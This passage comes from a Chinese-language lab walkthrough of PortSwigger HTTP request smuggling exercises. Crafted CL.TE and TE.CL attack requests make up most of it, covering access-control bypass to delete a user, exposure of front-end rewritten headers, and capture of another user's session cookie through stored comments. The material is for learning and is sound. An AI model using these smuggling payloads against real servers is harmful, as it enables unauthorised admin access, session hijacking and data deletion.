<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: xPOST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>

<p>​    由于此请求现在包含无效的URL，因此服务器将以状态代码404进行响应，指示攻击请求确实确实对其进行了干扰。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses</a></p>
<p>​    构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac201f6c1fc9901e8087240700e3006a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Jcr7wr0rAtPCIePHi3MpPtKYvXX6Oe3p</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111075880.png" alt="image-20200715110310018"></p>
<h4 id="4-2-2-使用差分响应确认TE-CL漏洞"><a href="#4-2-2-使用差分响应确认TE-CL漏洞" class="headerlink" title="4.2.2 使用差分响应确认TE.CL漏洞"></a>4.2.2 使用差分响应确认TE.CL漏洞</h4><p>​    要确认TE.CL漏洞，您将发送如下攻击请求（需要<code>\r\n\r\n</code>在final 后面加上尾随序列<code>0</code>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">7c</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>​    如果攻击成功，则<code>GET /404</code>后端服务器将从开始将所有内容视为属于接收到的下一个请求。这将导致随后的“正常”请求如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 146</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>

<p>​    由于此请求现在包含无效的URL，因此服务器将以状态代码404进行响应，指示攻击请求确实确实对其进行了干扰。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses</a></p>
<p>​    构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acd31fc11fdb90f980e526ce00b800a5.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;cGzs96HQw7tftthKo6AmNVgZ1wwj7PoH</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line">POST &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111144125.png" alt="image-20200715112252499"></p>
<h3 id="4-3-注意"><a href="#4-3-注意" class="headerlink" title="4.3 注意"></a>4.3 注意</h3><p>​    在尝试通过干扰其他请求来确认请求走私漏洞时，应牢记一些重要的注意事项：</p>
<ul>
<li>应使用不同的网络连接将“攻击”请求和“正常”请求发送到服务器。通过同一连接发送两个请求都不会证明该漏洞存在。</li>
<li>“攻击”请求和“正常”请求应尽可能使用相同的URL和参数名称。这是因为许多现代应用程序根据URL和参数将前端请求路由到不同的后端服务器。使用相同的URL和参数会增加由同一后端服务器处理请求的机会，这对于进行攻击至关重要。</li>
<li>在测试“正常”请求以检测来自“攻击”请求的任何干扰时，您正在与应用程序同时接收到的任何其他请求（包括来自其他用户的请求）竞争。您应该在“攻击”请求之后立即发送“正常”请求。如果应用程序忙，则可能需要执行多次尝试以确认漏洞。</li>
<li>在某些应用程序中，前端服务器用作负载平衡器，并根据某些负载平衡算法将请求转发到不同的后端系统。如果将您的“攻击”和“正常”请求转发到不同的后端系统，则攻击将失败。这是为什么您可能需要多次尝试才能确认漏洞的另一个原因。</li>
<li>如果您的攻击成功干扰了后续请求，但这不是您发送来检测干扰的“正常”请求，则意味着另一个应用程序用户受到了您的攻击的影响。如果继续执行测试，可能会对其他用户造成破坏性影响，因此应谨慎行事。</li>
</ul>
<h2 id="5、利用HTTP请求走私漏洞"><a href="#5、利用HTTP请求走私漏洞" class="headerlink" title="5、利用HTTP请求走私漏洞"></a>5、利用HTTP请求走私漏洞</h2><h3 id="5-1使用HTTP请求走私绕过前端安全控制"><a href="#5-1使用HTTP请求走私绕过前端安全控制" class="headerlink" title="5.1使用HTTP请求走私绕过前端安全控制"></a>5.1使用HTTP请求走私绕过前端安全控制</h3><p>​    在某些应用程序中，前端Web服务器用于实现某些安全控制，以决定是否允许处理单个请求。允许的请求将转发到后端服务器，在该服务器中，它们被视为已通过前端控件传递。</p>
<p>​    例如，假设应用程序使用前端服务器实施访问控制限制，则仅在授权用户访问请求的URL的情况下才转发请求。然后，后端服务器将接受每个请求，而无需进一步检查。在这种情况下，可以通过将请求走私到受限URL 来使用HTTP请求走私漏洞来绕过访问控制。</p>
<p>​    假设当前用户被允许访问，<code>/home</code>但不允许<code>/admin</code>。他们可以使用以下请求走私攻击来绕过此限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Foo: xGET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br></pre></td></tr></table></figure>

<p>​    前端服务器在这里看到两个请求，都针对<code>/home</code>，因此这些请求将转发到后端服务器。但是，后端服务器看到一个请求<code>/home</code>和一个请求<code>/admin</code>。它假定（一如既往）请求已通过前端控件传递，因此授予对受限URL的访问权限。</p>
<h4 id="5-1-1-利用HTTP请求走私绕过前端安全控制，CL-TE漏洞"><a href="#5-1-1-利用HTTP请求走私绕过前端安全控制，CL-TE漏洞" class="headerlink" title="5.1.1 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞"></a>5.1.1 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞</h4><p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>​    构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac3c1f3b1f789b7b80b20a1500f20052.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;1CH4IssbB55hFE9To7S50UmSzwFXCZul</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/1594911120149.png" alt="image-20200715115814697"></p>
<p>​    由于<code>/admin</code>没有使用对的标头，请求被拒绝。加上<code>Host: localhost</code>重新构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac241f861f25fb0e80b8452c0020001c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;gFcF7Hes3TMAxiyPHeKk8jNTEN9WCyAg</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 53</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111253436.png" alt="image-20200715141257824"></p>
<p>​    发送两次请求之后可以访问到<code>/admin</code>界面了，但是参考解析里面说到第二次：</p>
<blockquote>
<p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p>
</blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 116</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    通过上面的构造可以访问到管理面板。不知道为什么我加了个Host就可以成功了，有点玄学。可以访问<code>/admin</code>之后可以查看到删除用户的请求api。通过构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 139</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111296612.png" alt="image-20200715145849761"></p>
<p>​    删除成功自动跳转到<code>/admin</code>?再次查看<code>/admin</code>里面的用户。发现确实被删除了。</p>
<h4 id="5-1-2-利用HTTP请求走私绕过前端安全控制，TE-CL漏洞"><a href="#5-1-2-利用HTTP请求走私绕过前端安全控制，TE-CL漏洞" class="headerlink" title="5.1.2 利用HTTP请求走私绕过前端安全控制，TE.CL漏洞"></a>5.1.2 利用HTTP请求走私绕过前端安全控制，TE.CL漏洞</h4><p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p>
<p>​    同理上个实验，构造数据包，需要<code>\r\n\r\n</code>在后面加上尾随序列<code>0</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac3a1fae1e6af8dc808e11f800b3006a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;D0lB6HQGL0w9onv0dX9xPFQZgSLJDGGe</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line">POST &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111342521.png" alt="image-20200715155343460"></p>
<p>​    访问到<code>/admin</code>界面，之后用http走私进行删除用户操作，构造数据包:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac3a1fae1e6af8dc808e11f800b3006a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;D0lB6HQGL0w9onv0dX9xPFQZgSLJDGGe</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">87</span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111387508.png" alt="image-20200715161010401"></p>
<p>​    此处需说明一点，请求包中chunk分块传输的数据库长度必须正确，同时走私请求中的Content-Length长度也需保证正确，否则会提示无法识别或非法请求。（因而这里87对应的十进制是：135。）</p>
<p><img src="https://image.3001.net/images/20200716/15949111413085.png" alt="image-20200715161600238"></p>
<h3 id="5-2-显示前端请求重写"><a href="#5-2-显示前端请求重写" class="headerlink" title="5.2 显示前端请求重写"></a>5.2 显示前端请求重写</h3><p>​    在这种网络环境下，前端代理服务器在接收到请求后不会直接将请求转发给后端服务器，而是先添加一些必要的字段然后转发给后端服务器。</p>
<p>​    如果不能获取到前端代理服务器添加或重写的字段，那么我们走私的请求就无法被后端服务器处理。</p>
<p>​    如何获取这些值，这里有一个简单的方法：</p>
<ol>
<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
</ol>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p>
<p>​    页面有个搜索框：</p>
<p><img src="https://image.3001.net/images/20200716/1594911145829.png" alt="image-20200715163817407"></p>
<p>​    并且请求参数中的值能够输出到相应的POST请求中</p>
<p><img src="https://image.3001.net/images/20200716/1594911148265.png" alt="image-20200715163859508"></p>
<p>​    构造一个走私请求数据包，多次发送在前端中显示了HTTP请求</p>
<blockquote>
<p>解释一下：走私请求数据包中Content-length: 100，显然自身携带数据没有达到这个数目。</p>
<p>因而后端服务器会在收到第一个走私请求时会误以为该请求还没有结束，将不断接受新传来的HTTP请求直到长度达到100。</p>
<p>因此添加在search=test后的HTTP请求也成POST请求的一部分，最终将前端服务器添加的HTTP头显示在页面</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 109</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Udg4bkicRfjM9f2QNx0zP6Z51mcp0cfW</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">search&#x3D;test</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111522527.png" alt="image-20200715164704552"></p>
<p>​    将获取的HTTP头添加到走私请求中，再次发送数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 138</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Udg4bkicRfjM9f2QNx0zP6Z51mcp0cfW</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">X-FxStVB-Ip: 175.6.47.8</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">search&#x3D;test</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111576185.png" alt="image-20200715165211125"></p>
<p>​    重新构造一下xff头，值改为127.0.0.1，可查看到<code>/admin</code>界面</p>
<p><img src="https://image.3001.net/images/20200716/15949111605661.png" alt="image-20200715165730569"></p>
<p>​    构造删除用户数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;ac6d1f171e97a40f80a39c2d0050004c.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 170</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Udg4bkicRfjM9f2QNx0zP6Z51mcp0cfW</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1</span><br><span class="line">X-FxStVB-Ip: 127.0.0.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111651702.png" alt="image-20200715170954582"></p>
<h3 id="5-3-捕获其他用户的请求"><a href="#5-3-捕获其他用户的请求" class="headerlink" title="5.3 捕获其他用户的请求"></a>5.3 捕获其他用户的请求</h3><p>​    如果应用程序包含任何允许存储和检索文本数据的功能，则可以使用HTTP请求走私来捕获其他用户请求的内容。这些可能包括会话令牌，启用会话劫持攻击或用户提交的其他敏感数据。用作攻击手段的合适功能是注释，电子邮件，配置文件描述，屏幕名称等。</p>
<p>​    要进行攻击，您需要走私一个将数据提交到存储功能的请求，其参数包含位于请求最后的数据。后端服务器处理的下一个请求将附加到走私请求上，结果将存储另一个用户的原始请求。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p>
<p>​    访问博客文章并发表评论。将<code>comment-post</code>请求发送到Burp Repeater，将主体参数随机播放，以使该<code>comment</code>参数最后出现，并确保它仍然有效。将<code>comment-post</code>请求<code>Content-Length</code>增加到400，然后将其走私到后端服务器，构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac9e1f401f037f30802f1770002200fc.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;GvJSTvhXyJeJlPNbJZHneuEjDwJL24XL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 259</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;post&#x2F;comment HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 600</span><br><span class="line">Cookie: session&#x3D;GvJSTvhXyJeJlPNbJZHneuEjDwJL24XL</span><br><span class="line"></span><br><span class="line">csrf&#x3D;ZrUm7NFnwTcKipoyhKdLML4JUG2nsVKs&amp;postId&#x3D;4&amp;name&#x3D;joker&amp;email&#x3D;test%40test.com&amp;website&#x3D;&amp;comment&#x3D;test</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111706677.png" alt="image-20200715211510854"></p>
<p>​    查看博客文章以查看是否有包含用户请求的评论。请注意，目标用户只会间歇地浏览该网站，因此您可能需要多次重复此攻击才能成功。</p>
<p>​    如果存储的请求不完整并且不包含Cookie头，则需要缓慢增加走私请求中Content-Length头的值，直到捕获整个cookie。</p>
<p>​    从注释中复制用户的Cookie标头，然后使用它访问其帐户。</p>
<p><img src="https://image.3001.net/images/20200716/15949111734542.png" alt="image-20200715211714093"></p>
<p>​    上图为自己访问，获取自己的cookie。</p>
<p>​    如果需要获取到机器人的cookie值，需要不断的摸索CL长度，把cookie值显示完全，不能太长也不能太短。用了将近两个小时摸索到规律（说到底还是自己太菜了。。），获取的cookie如下：</p>
<p><img src="https://image.3001.net/images/20200716/15949111789844.png" alt="image-20200715231233458"></p>
<h3 id="5-4-使用HTTP请求走私来利用反射的XSS"><a href="#5-4-使用HTTP请求走私来利用反射的XSS" class="headerlink" title="5.4 使用HTTP请求走私来利用反射的XSS"></a>5.4 使用HTTP请求走私来利用反射的XSS</h3><p>​    如果应用程序容易受到HTTP请求走私的影响，并且还包含反射的XSS，则可以使用请求走私攻击来攻击该应用程序的其他用户。这种方法在两种方面优于对反射XSS的正常利用：</p>
<ul>
<li>它不需要与受害者用户进行交互。您不需要向他们提供URL，也不必等待他们访问它。您只是走私了包含XSS有效负载的请求，后端服务器将处理下一个用户的请求。</li>
<li>它可以用于在请求的某些部分中利用XSS行为，而这些部分在正常的反射XSS攻击中是无法轻松控制的，例如HTTP请求标头。</li>
</ul>
